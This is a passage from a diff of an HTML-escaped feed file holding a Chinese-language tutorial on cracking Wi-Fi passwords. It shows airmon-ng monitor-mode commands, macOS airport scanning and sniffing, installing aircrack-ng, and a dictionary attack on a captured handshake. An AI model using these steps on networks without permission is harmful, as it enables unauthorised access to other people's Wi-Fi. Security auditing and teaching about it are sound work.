+&lt;/h3&gt;&lt;p&gt;使用命令：&lt;code&gt;airmon-ng stop &amp;lt;处于监听模式的无限网卡名称&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PHY	Interface	Driver		Chipset
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		(mac80211 station mode vif enabled on [phy0]wlp8s0)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		(mac80211 monitor mode vif disabled for [phy0]wlp8s0mon)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;mac-os-篇&#34;&gt;MAC OS 篇
+&lt;/h2&gt;&lt;h3 id=&#34;1-查看网卡名称&#34;&gt;1. 查看网卡名称
+&lt;/h3&gt;&lt;p&gt;在终端中执行 &lt;code&gt;ifconfig&lt;/code&gt; 即可查看，通常是 en0&lt;/p&gt;
+&lt;h3 id=&#34;2-使用-airport-监听无线网络&#34;&gt;2. 使用 airport 监听无线网络
+&lt;/h3&gt;&lt;p&gt;由于某些原因，airmon-ng 无法在 MAC OS 使用，所以只能使用 airport 进行扫描和抓包了，但是并不好用，所以还是使用 linux 吧尽量&amp;hellip;&lt;/p&gt;
+&lt;p&gt;开始扫描，终端中执行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;扫描结果会是这样的：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;SSID&lt;/th&gt;
+          &lt;th&gt;BSSID&lt;/th&gt;
+          &lt;th&gt;RSSI&lt;/th&gt;
+          &lt;th&gt;CHANNEL&lt;/th&gt;
+          &lt;th&gt;HT&lt;/th&gt;
+          &lt;th&gt;CC&lt;/th&gt;
+          &lt;th&gt;SECURITY (auth/unicast/group)&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;小米手机&lt;/td&gt;
+          &lt;td&gt;22:47:da:62:2a:f0&lt;/td&gt;
+          &lt;td&gt;-29&lt;/td&gt;
+          &lt;td&gt;6&lt;/td&gt;
+          &lt;td&gt;Y&lt;/td&gt;
+          &lt;td&gt;&amp;ndash;&lt;/td&gt;
+          &lt;td&gt;WPA2(PSK/AES/AES)&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;ul&gt;
+&lt;li&gt;SSID 表示 Wi-Fi 名称&lt;/li&gt;
+&lt;li&gt;BSSID 表示 Wi-Fi 设备的硬件地址&lt;/li&gt;
+&lt;li&gt;RSSI 表示信号强度，值是负数，绝对值越小信号越强&lt;/li&gt;
+&lt;li&gt;CHANNEL 表示 Wi-Fi 信道&lt;/li&gt;
+&lt;li&gt;HT 表示吞吐量模式，一般都为 Y&lt;/li&gt;
+&lt;li&gt;CC 表示国家，中国为 CN&lt;/li&gt;
+&lt;li&gt;SECURITY 表示加密方式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-使用-airport-进行抓包&#34;&gt;3. 使用 airport 进行抓包
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;抓一段儿事件之后，使用 Ctrl + C 停止抓包，完成后会生成一个 cap 包，看到如下提示：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Session saved to /tmp/airportSniff0RjCAO.cap.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;4-安装-aircrack-ng&#34;&gt;4. 安装 &lt;a class=&#34;link&#34; href=&#34;https://aircrack-ng.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;aircrack-ng&lt;/a&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;使用 &lt;a class=&#34;link&#34; href=&#34;https://brew.sh/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Homebrew&lt;/a&gt; 安装：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brew install aircrack-ng
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;5-使用-aircrack-ng-执行破解&#34;&gt;5. 使用 aircrack-ng 执行破解
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aircrack-ng -w common.txt /tmp/airportSniff0RjCAO.cap
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;windows&#34;&gt;Windows
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://aircrack-ng.org/downloads.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;下载 Aircrack-ng&lt;/a&gt; 提供了 Windows 的二进制包&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用 &lt;a class=&#34;link&#34; href=&#34;https://docs.microsoft.com/en-us/windows/wsl/about&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;WSL&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;更多安装方式参考安装-aircrack-ng&#34;&gt;更多安装方式参考：&lt;a class=&#34;link&#34; href=&#34;https://aircrack-ng.org/install.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;安装 Aircrack-ng&lt;/a&gt;
+&lt;/h3&gt;</description>
         </item>
         
     </channel>
